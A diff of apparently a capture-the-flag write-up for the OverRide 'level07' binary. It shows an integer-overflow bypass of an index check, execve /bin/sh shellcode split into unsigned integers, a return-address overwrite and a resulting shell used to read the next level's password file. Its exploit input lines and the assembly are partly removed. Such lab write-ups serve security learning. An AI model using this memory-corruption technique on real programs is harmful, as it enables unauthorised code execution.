@@ -1,27 +1,6 @@
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
 
-
-level07@OverRide:~$ objdump -R level07
-
-level07:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-08049ff0 R_386_GLOB_DAT    __gmon_start__
-0804a040 R_386_COPY        stdin
-0804a060 R_386_COPY        stdout
-0804a000 R_386_JUMP_SLOT   printf
-0804a004 R_386_JUMP_SLOT   fflush                     # ffluch "cleanse" env variable, making us unable to store shellcode there
-0804a008 R_386_JUMP_SLOT   getchar
-0804a00c R_386_JUMP_SLOT   fgets
-0804a010 R_386_JUMP_SLOT   __stack_chk_fail
-0804a014 R_386_JUMP_SLOT   puts
-0804a018 R_386_JUMP_SLOT   __gmon_start__
-0804a01c R_386_JUMP_SLOT   __libc_start_main
-0804a020 R_386_JUMP_SLOT   memset
-0804a024 R_386_JUMP_SLOT   __isoc99_scanf
-
 > ./level07
 ----------------------------------------------------
   Welcome to wil's crappy number storage service!
@@ -54,29 +33,7 @@ Input command: store
 # We have other index reserved for index % 3 == 0
 
 
-
- 804864c:	e8 1f fe ff ff       	call   8048470 <printf@plt>
- 8048651:	e8 91 ff ff ff       	call   80485e7 <get_unum>
- 8048656:	89 45 f0             	mov    %eax,-0x10(%ebp)         # Where number is stored
-
-
- 8048666:	e8 7c ff ff ff       	call   80485e7 <get_unum>
- 804866b:	89 45 f4             	mov    %eax,-0xc(%ebp)          # Where index is stored
- 804866e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
- 8048671:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
- 8048676:	89 c8                	mov    %ecx,%eax
- 8048678:	f7 e2                	mul    %edx
- 804867a:	d1 ea                	shr    %edx
- 804867c:	89 d0                	mov    %edx,%eax
- 804867e:	01 c0                	add    %eax,%eax
- 8048680:	01 d0                	add    %edx,%eax# 
- 8048682:	89 ca                	mov    %ecx,%edx
- 8048684:	29 c2                	sub    %eax,%edx
- 8048686:	85 d2                	test   %edx,%edx
- 8048688:	74 0d                	je     8048697 <store_number+0x67>
-
 # Check if index % 3 == 0 and jump to error return
-https://stackoverflow.com/questions/44212301/efficient-mod-3-in-x86-assembly # Common Knowledge ofc
 
 # Ok so we know we can store data as unsigned int (4 bytes) in this array and that some value are inaccessible (n % 3 == 0), we can't use env_var,
 there is no buffer we can directly overflow, no weak printf nor function, no call of `/bin/sh`
@@ -154,76 +111,20 @@ Stack level 0, frame at 0xffffd6e0:
 > Input command: quit
 Segmentation fault (core dumped)        # Segfault cause we override, main return, if you don't get why, read again stack functionement
 
-# Let's store our shellcode (split 4 bytes, format to endian used, convert to int and store to index from 0 to x)
+# Let's store our shellcode (split 4 bytes, format to endian used, convert to int and store to index from x+0 to x+i)
 "\x6a\x0b\x58\x99" "\x52\x68\x2f\x2f" \x73\x68\x68\x2f" "\x62\x69\x6e\x89" "\xe3\x31\xc9\xcd" "\x80"
-[0] -> [1073741824] = \x99\x58\x0b\x6a = 2572684138
-[1] = \x2f\x2f\x68\x52 = 791636050
-[2] = \x2f\x68\x68\x73 = 795371635
-[3] -> [1073741827] = \x89\x6e\x69\x62 = 2305714530
-[4] = \xcd\xc9\x31\xe3 = 3452514787
-[5] = \x80 = 128
+[x+0] -> [1073741824+x] = \x99\x58\x0b\x6a = 2572684138
+[x+1] = \x2f\x2f\x68\x52 = 791636050
+[x+2] = \x2f\x68\x68\x73 = 795371635
+[x+3] -> [1073741827+x] = \x89\x6e\x69\x62 = 2305714530
+[x+4] = \xcd\xc9\x31\xe3 = 3452514787
+[x+5] = \x80 = 128
 
-[114] -> [1073741938] = 0xffffd514 = 4294956308
-# Not working, the stack is probably ramble a bit so we don't have the correct address
-# We can try to find it during the execution, since we previously found the adress we can use it (0xffffd4f0:	0xffffd514)
-> 0xffffd4f0 - 0xffffd514
--36
-> _ / 4
--9.0
+# We are putting lot of nop to avoid boring precise adressing and go brrrr
+# See script in ressource
 
-# When we check at array -9 we get accurate location in the stack
-# Ok we test run exploit, read [-9] during exec, then store the value in [114]
+level07@OverRide:~$ (python /tmp/exploit.py; cat) | ./level07 
 
-------/tmp/exploit------
-store
-2572684138
-1073741824
-store
-791636050
-1
-store
-795371635
-2
-store
-2305714530
-1073741827
-store
-3452514787
-4
-store
-128
-5
-------------------------
-
-
-# WE GO BRRRR
-> cat /tmp/exploit - | ./level07
-----------------------------------------------------
-  Welcome to wil's crappy number storage service!
-----------------------------------------------------
- Commands:
-    store - store a number into the data storage
-    read  - read a number from the data storage
-    quit  - exit the program
-----------------------------------------------------
-   wil has reserved some storage :>
-----------------------------------------------------
-
-Input command:  Number:  Index:  Completed store command successfully
-Input command:  Number:  Index:  Completed store command successfully
-Input command:  Number:  Index:  Completed store command successfully
-Input command:  Number:  Index:  Completed store command successfully
-Input command:  Number:  Index:  Completed store command successfully
-Input command:  Number:  Index:  Completed store command successfully
-read
-Input command:  Index: -9
- Number at data[4294967287] is 4294956356
- Completed read command successfully
-store
-Input command:  Number: 4294956356
- Index: 1073741938
- Completed store command successfully
-quit
 whoami
 level08
 cat /home/users/level08/.pass
